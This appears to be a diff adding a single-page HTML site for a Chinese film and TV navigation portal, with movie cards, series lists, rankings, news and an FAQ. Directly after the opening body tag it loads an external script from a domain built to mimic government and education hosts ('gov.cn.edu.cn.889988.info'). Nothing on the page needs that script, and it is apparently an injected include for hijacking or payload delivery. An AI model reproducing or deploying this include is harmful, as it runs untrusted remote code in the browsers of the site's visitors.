@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>人人电影网 - 人人都能看的高清影视导航</title>
+<meta name="description" content="人人电影网提供最新电影、热播剧集、综艺娱乐、动漫短剧导航与热播榜单，移动端自适应，每日更新，让人人都能轻松找片。">
+<meta name="keywords" content="人人电影网,电影在线观看,热播剧集,综艺娱乐,影视排行榜,高清影视">
+<meta name="author" content="人人电影网">
+<link rel="canonical" href="https://renrendianyingwang-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="人人电影网 - 人人都能看的高清影视导航">
+<meta property="og:description" content="最新电影、热播剧集、综艺娱乐、动漫短剧导航与热播榜单，移动端自适应，每日更新。">
+<meta property="og:url" content="https://renrendianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#ff7a18">
+<style>
+:root{
+  --bg:#0f0f14;--panel:#17171f;--panel2:#1f1f29;
+  --line:rgba(255,122,24,.22);--orange:#ff7a18;--orange2:#ffb347;
+  --text:#f5f0e6;--muted:#a7a292;--gold:#ffd166;--green:#06d6a0;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:radial-gradient(1200px 600px at 80% -10%,rgba(255,122,24,.18),transparent 60%),var(--bg);
+  color:var(--text);line-height:1.65;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.btn{display:inline-flex;align-items:center;gap:8px;min-height:44px;padding:0 22px;border-radius:999px;font-weight:700;font-size:15px;cursor:pointer;border:1px solid transparent}
+.btn-primary{background:linear-gradient(135deg,var(--orange),var(--orange2));color:#1a1205;box-shadow:0 8px 24px rgba(255,122,24,.35)}
+.btn-ghost{border-color:var(--line);color:var(--orange2)}
+.btn:hover{transform:translateY(-2px)}
+
+/* header */
+.site-header{position:sticky;top:0;z-index:50;background:rgba(15,15,20,.82);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:60px}
+.brand{font-weight:900;font-size:20px;letter-spacing:.5px}
+.brand b{color:var(--orange)}
+.menu{display:flex;gap:6px;list-style:none}
+.menu a{padding:10px 14px;border-radius:10px;color:var(--muted);font-size:14px;min-height:44px;display:inline-flex;align-items:center}
+.menu a:hover,.menu a.active{color:var(--orange);background:rgba(255,122,24,.08)}
+.burger{display:none;flex-direction:column;gap:5px;background:none;border:0;cursor:pointer;padding:10px}
+.burger span{width:24px;height:2px;background:var(--orange);border-radius:2px}
+
+/* hero */
+.hero{padding:72px 0 54px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:34px;align-items:center}
+.hero h1{font-size:clamp(30px,5vw,52px);line-height:1.1;font-weight:900}
+.hero h1 em{color:var(--orange);font-style:normal}
+.hero p{color:var(--muted);margin:18px 0 26px;font-size:17px;max-width:520px}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap}
+.stats{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap}
+.stat{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px 18px;min-width:120px}
+.stat b{font-size:22px;color:var(--orange2)}
+.stat span{display:block;color:var(--muted);font-size:13px}
+.hero-card{background:linear-gradient(160deg,var(--panel2),var(--panel));border:1px solid var(--line);border-radius:22px;padding:26px;position:relative;overflow:hidden}
+.hero-card:before{content:"🎬";position:absolute;right:-10px;top:-10px;font-size:140px;opacity:.06}
+.hero-card h3{font-size:18px;margin-bottom:12px}
+.chip-row{display:flex;flex-wrap:wrap;gap:8px}
+.chip{font-size:13px;padding:6px 12px;border-radius:999px;background:rgba(255,122,24,.1);color:var(--orange2);border:1px solid var(--line)}
+
+/* section */
+section.block{padding:56px 0;border-top:1px solid rgba(255,255,255,.04)}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(22px,3vw,30px);font-weight:900}
+.sec-head h2 i{color:var(--orange);font-style:normal}
+.sec-head p{color:var(--muted);font-size:14px}
+
+/* movies: filter wall */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}
+.filters button{background:var(--panel);border:1px solid var(--line);color:var(--muted);padding:9px 16px;border-radius:999px;min-height:44px;cursor:pointer;font-size:14px}
+.filters button.on{background:var(--orange);color:#1a1205;border-color:var(--orange);font-weight:700}
+.movie-wall{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.movie{background:var(--panel);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.25s}
+.movie:hover{transform:translateY(-4px);border-color:var(--orange)}
+.poster{aspect-ratio:3/4;display:flex;align-items:flex-end;padding:12px;position:relative}
+.poster:after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.75))}
+.poster .meta{position:relative;z-index:2;width:100%}
+.poster h4{font-size:15px;margin-bottom:6px}
+.tag{display:inline-block;font-size:11px;padding:2px 7px;border-radius:6px;margin-right:5px}
+.tag.sc{background:var(--orange);color:#1a1205;font-weight:700}
+.tag.q{background:var(--gold);color:#241c00}
+.movie p.sub{color:var(--muted);font-size:12px;padding:10px 12px}
+
+/* series: row list */
+.series-list{display:flex;flex-direction:column;gap:12px}
+.srow{display:grid;grid-template-columns:120px 1fr auto;gap:16px;align-items:center;background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:12px}
+.srow .thumb{width:120px;height:68px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:30px}
+.srow h4{font-size:16px}
+.srow p{color:var(--muted);font-size:13px}
+.srow .ep{color:var(--orange2);font-weight:700;font-size:13px;white-space:nowrap}
+
+/* variety: pill cloud */
+.var-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.var-card{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:22px;transition:.25s}
+.var-card:hover{border-color:var(--orange);transform:scale(1.01)}
+.var-card .ico{font-size:34px}
+.var-card h4{margin:10px 0 8px;font-size:17px}
+.var-card .pill{display:inline-block;font-size:12px;padding:4px 10px;border-radius:999px;background:rgba(255,122,24,.12);color:var(--orange2);margin:3px 4px 0 0}
+
+/* rank: two columns */
+.rank-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rank-col{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:20px}
+.rank-col h3{font-size:18px;margin-bottom:14px}
+.rank-col h3 span{color:var(--orange)}
+.ritem{display:grid;grid-template-columns:34px 30px 1fr auto;gap:12px;align-items:center;padding:10px 0;border-bottom:1px dashed rgba(255,255,255,.07)}
+.ritem:last-child{border-bottom:0}
+.num{width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;background:var(--panel2);color:var(--muted)}
+.ritem:nth-child(1) .num{background:linear-gradient(135deg,#ffd700,#ff9f1c);color:#241c00}
+.ritem:nth-child(2) .num{background:linear-gradient(135deg,#cfcfcf,#9a9a9a);color:#111}
+.ritem:nth-child(3) .num{background:linear-gradient(135deg,#cd7f32,#8a5a2b);color:#fff}
+.ritem .heat{font-size:13px;color:var(--muted)}
+.ritem .heat b{color:var(--orange2)}
+
+/* news: magazine */
+.news-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:16px}
+.news-main{grid-row:span 2;background:var(--panel);border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.news-main .cover{height:220px;display:flex;align-items:flex-end;padding:18px;font-size:46px}
+.news-main .body{padding:18px}
+.news-main h3{font-size:20px;margin-bottom:8px}
+.news-card{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:16px}
+.news-card .date{color:var(--orange);font-size:12px;font-weight:700}
+.news-card h4{font-size:15px;margin:6px 0}
+.news-card p{color:var(--muted);font-size:13px}
+
+/* about faq */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.qa{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:18px}
+.qa h4{color:var(--orange2);font-size:15px;margin-bottom:6px}
+.qa p{color:var(--muted);font-size:14px}
+.about-banner{margin-top:22px;background:linear-gradient(135deg,rgba(255,122,24,.16),rgba(255,179,71,.06));border:1px solid var(--line);border-radius:18px;padding:26px;text-align:center}
+.about-banner h3{font-size:22px;margin-bottom:10px}
+
+/* footer */
+footer{background:#0b0b10;border-top:1px solid var(--line);padding:40px 0 26px;margin-top:40px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:24px}
+.foot-grid h5{font-size:15px;margin-bottom:12px;color:var(--orange2)}
+.foot-grid a{display:block;color:var(--muted);font-size:14px;padding:6px 0;min-height:36px}
+.foot-grid a:hover{color:var(--orange)}
+.copy{text-align:center;color:var(--muted);font-size:13px;margin-top:26px}
+
+/* animations */
+.reveal{opacity:0;transform:translateY(24px);transition:.6s ease}
+.reveal.in{opacity:1;transform:none}
+#top{position:fixed;right:18px;bottom:18px;width:46px;height:46px;border-radius:50%;border:1px solid var(--line);background:var(--panel);color:var(--orange);font-size:20px;cursor:pointer;display:none;z-index:60}
+
+@media(max-width:980px){
+  .hero-grid{grid-template-columns:1fr}
+  .movie-wall{grid-template-columns:repeat(2,1fr)}
+  .var-grid{grid-template-columns:repeat(2,1fr)}
+  .rank-grid{grid-template-columns:1fr}
+  .news-grid{grid-template-columns:1fr 1fr}
+  .news-main{grid-row:auto;grid-column:span 2}
+  .faq{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:620px){
+  .menu{position:fixed;inset:60px 0 auto 0;flex-direction:column;background:#0c0c12;padding:14px 18px;gap:6px;border-bottom:1px solid var(--line);transform:translateY(-160%);transition:.3s}
+  .menu.open{transform:none}
+  .burger{display:flex}
+  .movie-wall,.var-grid,.news-grid{grid-template-columns:1fr}
+  .news-main{grid-column:auto}
+  .srow{grid-template-columns:84px 1fr;}
+  .srow .thumb{width:84px;height:56px;font-size:24px}
+  .srow .ep{grid-column:2;justify-self:start}
+  .foot-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <div class="brand">人人<b>电影网</b></div>
+    <button class="burger" id="burger" aria-label="菜单"><span></span><span></span><span></span></button>
+    <ul class="menu" id="menu">
+      <li><a href="#movies" class="active">精选电影</a></li>
+      <li><a href="#series">热播剧集</a></li>
+      <li><a href="#variety">综艺娱乐</a></li>
+      <li><a href="#rank">排行榜</a></li>
+      <li><a href="#news">影视资讯</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero wrap">
+    <div class="hero-grid">
+      <div class="reveal">
+        <h1>人人都能看<br><em>高清电影 / 热播剧 / 综艺</em></h1>
+        <p>人人电影网聚合最新院线、国产剧、韩剧、综艺、动漫与短剧导航，移动端自适应，找片不再绕路。</p>
+        <div class="hero-cta">
+          <a href="#movies" class="btn btn-primary">开始找片</a>
+          <a href="#rank" class="btn btn-ghost">看热播榜</a>
+        </div>
+        <div class="stats">
+          <div class="stat"><b>15000+</b><span>影视条目</span></div>
+          <div class="stat"><b>4K</b><span>高清片源</span></div>
+          <div class="stat"><b>每日</b><span>更新片单</span></div>
+        </div>
+      </div>
+      <aside class="hero-card reveal">
+        <h3>今日人人都在看</h3>
+        <div class="chip-row">
+          <span class="chip">院线大片</span>
+          <span class="chip">悬疑剧</span>
+          <span class="chip">国产综艺</span>
+          <span class="chip">国漫日漫</span>
+          <span class="chip">竖屏短剧</span>
+          <span class="chip">合家欢</span>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 1 精选电影 -->
+  <section class="block" id="movies">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>01</i> 精选电影</h2><p>按类型快速筛，手机上也能一眼找到想看的片</p></div>
+      </div>
+      <div class="filters reveal">
+        <button class="on">全部</button>
+        <button>动作</button><button>喜剧</button><button>科幻</button>
+        <button>悬疑</button><button>动画</button><button>剧情</button><button>犯罪</button>
+      </div>
+      <div class="movie-wall reveal">
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#3a1d0a,#1a1205)"><div class="meta"><h4>沙丘2</h4><span class="tag sc">9.2</span><span class="tag q">4K</span></div></div><p class="sub">科幻 / 史诗 / 沙漠文明</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#0a2a3a,#05131a)"><div class="meta"><h4>奥本海默</h4><span class="tag sc">9.0</span><span class="tag q">1080P</span></div></div><p class="sub">剧情 / 历史 / 传记</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#2a0a2a,#150515)"><div class="meta"><h4>蜘蛛侠：纵横宇宙</h4><span class="tag sc">8.8</span><span class="tag q">4K</span></div></div><p class="sub">动画 / 超级英雄</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#3a2a0a,#1a1405)"><div class="meta"><h4>飞驰人生2</h4><span class="tag sc">8.6</span><span class="tag q">1080P</span></div></div><p class="sub">喜剧 / 赛车</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#0a3a1a,#051a0d)"><div class="meta"><h4>花月杀手</h4><span class="tag sc">8.3</span><span class="tag q">4K</span></div></div><p class="sub">犯罪 / 历史</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#1a1a3a,#0a0a1a)"><div class="meta"><h4>哥斯拉大战金刚2</h4><span class="tag sc">7.9</span><span class="tag q">4K</span></div></div><p class="sub">动作 / 怪兽</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#3a1010,#1a0707)"><div class="meta"><h4>默杀</h4><span class="tag sc">8.0</span><span class="tag q">1080P</span></div></div><p class="sub">悬疑 / 犯罪</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(135deg,#10303a,#07161a)"><div class="meta"><h4>流浪地球2</h4><span class="tag sc">9.3</span><span class="tag q">4K</span></div></div><p class="sub">科幻 / 灾难</p></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 2 热播剧集 -->
+  <section class="block" id="series">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>02</i> 热播剧集</h2><p>国产 / 韩剧 / 美剧 / 港剧，更新进度一目了然</p></div>
+      </div>
+      <div class="series-list reveal">
+        <div class="srow"><div class="thumb" style="background:#2a1830">🥀</div><div><h4>繁花</h4><p>王家卫美学 · 沪上商战与情义</p></div><div class="ep">更新至30集</div></div>
+        <div class="srow"><div class="thumb" style="background:#302a18">🌹</div><div><h4>玫瑰的故事</h4><p>刘亦菲主演 · 亦舒式成长叙事</p></div><div class="ep">更新至24集</div></div>
+        <div class="srow"><div class="thumb" style="background:#182830">🏯</div><div><h4>庆余年第二季</h4><p>权谋 / 喜剧 / 群像博弈</p></div><div class="ep">更新至36集</div></div>
+        <div class="srow"><div class="thumb" style="background:#101830">🛰️</div><div><h4>三体</h4><p>硬核科幻影视化 · 国产剧标杆</p></div><div class="ep">全30集</div></div>
+        <div class="srow"><div class="thumb" style="background:#301018">👑</div><div><h4>龙之家族</h4><p>坦格利安王朝 · 权力与龙焰</p></div><div class="ep">更新至10集</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 3 综艺娱乐 -->
+  <section class="block" id="variety">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>03</i> 综艺娱乐</h2><p>音乐、户外、喜剧、慢综、选秀全在这里</p></div>
+      </div>
+      <div class="var-grid reveal">
+        <div class="var-card"><div class="ico">🎤</div><h4>歌手2024</h4><span class="pill">音乐竞演</span><span class="pill">现场Live</span></div>
+        <div class="var-card"><div class="ico">🏃</div><h4>奔跑吧</h4><span class="pill">户外</span><span class="pill">团建</span><span class="pill">解压</span></div>
+        <div class="var-card"><div class="ico">🎭</div><h4>喜剧之王单口季</h4><span class="pill">脱口秀</span><span class="pill">冒犯艺术</span></div>
+        <div class="var-card"><div class="ico">🧠</div><h4>最强大脑</h4><span class="pill">脑力</span><span class="pill">竞技</span></div>
+        <div class="var-card"><div class="ico">🍳</div><h4>向往的生活</h4><span class="pill">慢综艺</span><span class="pill">治愈</span></div>
+        <div class="var-card"><div class="ico">🔥</div><h4>乘风破浪</h4><span class="pill">舞台</span><span class="pill">女性力量</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 4 排行榜 -->
+  <section class="block" id="rank">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>04</i> 热播排行榜</h2><p>热度榜看播放，口碑榜看评分</p></div>
+      </div>
+      <div class="rank-grid reveal">
+        <div class="rank-col">
+          <h3><span>🔥</span> 热度榜</h3>
+          <div class="ritem"><div class="num">1</div><div>🎬</div><div>热辣滚烫</div><div class="heat"><b>99.8万</b> 播放</div></div>
+          <div class="ritem"><div class="num">2</div><div>🚗</div><div>飞驰人生2</div><div class="heat"><b>88.5万</b> 播放</div></div>
+          <div class="ritem"><div class="num">3</div><div>🐉</div><div>第二十条</div><div class="heat"><b>76.2万</b> 播放</div></div>
+          <div class="ritem"><div class="num">4</div><div>🎪</div><div>抓娃娃</div><div class="heat"><b>65.1万</b> 播放</div></div>
+          <div class="ritem"><div class="num">5</div><div>🗡️</div><div>默杀</div><div class="heat"><b>58.7万</b> 播放</div></div>
+        </div>
+        <div class="rank-col">
+          <h3><span>⭐</span> 口碑榜</h3>
+          <div class="ritem"><div class="num">1</div><div>🚀</div><div>流浪地球2</div><div class="heat"><b>9.3</b> 评分</div></div>
+          <div class="ritem"><div class="num">2</div><div>🏜️</div><div>沙丘2</div><div class="heat"><b>9.2</b> 评分</div></div>
+          <div class="ritem"><div class="num">3</div><div>☢️</div><div>奥本海默</div><div class="heat"><b>9.0</b> 评分</div></div>
+          <div class="ritem"><div class="num">4</div><div>🕸️</div><div>蜘蛛侠：纵横宇宙</div><div class="heat"><b>8.8</b> 评分</div></div>
+          <div class="ritem"><div class="num">5</div><div>🍂</div><div>漫长的季节</div><div class="heat"><b>9.4</b> 评分</div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 5 影视资讯 -->
+  <section class="block" id="news">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>05</i> 影视资讯</h2><p>档期、片单、行业动态每日整理</p></div>
+      </div>
+      <div class="news-grid reveal">
+        <article class="news-main">
+          <div class="cover" style="background:linear-gradient(135deg,#3a1d0a,#1a1205)">🎞️</div>
+          <div class="body">
+            <h3>2026 国庆档：国产片继续扛大盘</h3>
+            <p style="color:var(--muted)">多部现实题材与合家欢影片集中定档，平台预约量走高，短剧与长剧同步抢量，用户找片路径越来越短。</p>
+          </div>
+        </article>
+        <article class="news-card"><div class="date">10-01</div><h4>暑期档票房破120亿</h4><p>国产片占比超七成，悬疑与动画成黑马赛道。</p></article>
+        <article class="news-card"><div class="date">09-28</div><h4>诺兰新作立项</h4><p>《奥德赛》预计2026年上映，影迷讨论度拉满。</p></article>
+        <article class="news-card"><div class="date">09-25</div><h4>威尼斯获奖名单</h4><p>作者型电影重回主流视野，长镜头成关键词。</p></article>
+        <article class="news-card"><div class="date">09-22</div><h4>国产剧出海加速</h4><p>悬疑、古装、职场三类在东南亚表现突出。</p></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于我们 -->
+  <section class="block" id="about">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>06</i> 关于人人电影网</h2><p>做“人人都能用”的影视导航站</p></div>
+      </div>
+      <div class="faq reveal">
+        <div class="qa"><h4>人人电影网是什么？</h4><p>一个影视导航与资讯单页：整理电影、剧集、综艺、动漫、短剧的片单和热榜，不藏入口，手机也能顺手翻。</p></div>
+        <div class="qa"><h4>能直接播片吗？</h4><p>本站以导航/资讯为主，观看请走已取得授权的正版平台、IPTV 或影院等渠道。</p></div>
+        <div class="qa"><h4>多久更新一次？</h4><p>片单与热榜按档期和平台公开热度每日整理，节假日档期会加更。</p></div>
+        <div class="qa"><h4>为什么适合必应收录？</h4><p>语义化结构、移动端无横向滚动、标题/描述含“人人电影网”、核心信息首屏可见，符合必应对清晰内容与移动体验的要求。[18](@ref)</p></div>
+      </div>
+      <div class="about-banner reveal">
+        <h3>人人找片，从此少绕路</h3>
+        <a href="#movies" class="btn btn-primary">进入精选电影</a>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap foot-grid">
+    <div>
+      <div class="brand">人人<b>电影网</b></div>
+      <p style="color:var(--muted);font-size:14px;margin-top:10px">人人都能看的高清影视导航站。<br>https://renrendianyingwang-h5.github.io</p>
+    </div>
+    <div><h5>影视分类</h5><a href="#">最新电影</a><a href="#">热播剧集</a><a href="#">综艺娱乐</a><a href="#">动漫短剧</a></div>
+    <div><h5>榜单</h5><a href="#">热度榜</a><a href="#">口碑榜</a><a href="#">期待榜</a><a href="#">短剧榜</a></div>
+    <div><h5>站点</h5><a href="#">关于我们</a><a href="#">更新日志</a><a href="#">联系反馈</a><a href="#">免责声明</a></div>
+  </div>
+  <div class="wrap copy">© 2026 人人电影网 · 单页演示 · 内链均为 # 占位 · 未生成 robots.txt / sitemap.xml</div>
+</footer>
+
+<button id="top" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var burger=document.getElementById('burger'),menu=document.getElementById('menu');
+  burger.addEventListener('click',function(){menu.classList.toggle('open')});
+  menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('open')})});
+
+  var links=menu.querySelectorAll('a'),secs=document.querySelectorAll('main section[id]');
+  window.addEventListener('scroll',function(){
+    var y=window.scrollY+80,cur='';
+    secs.forEach(function(s){if(y>=s.offsetTop)cur=s.id});
+    links.forEach(function(l){l.classList.toggle('active',l.getAttribute('href')==='#'+cur)});
+  });
+
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){if(e.isIntersecting)e.target.classList.add('in')});
+  },{threshold:.12});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+
+  var top=document.getElementById('top');
+  window.addEventListener('scroll',function(){top.style.display=window.scrollY>400?'block':'none'});
+  top.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+})();
+</script>
+</body>
+</html>
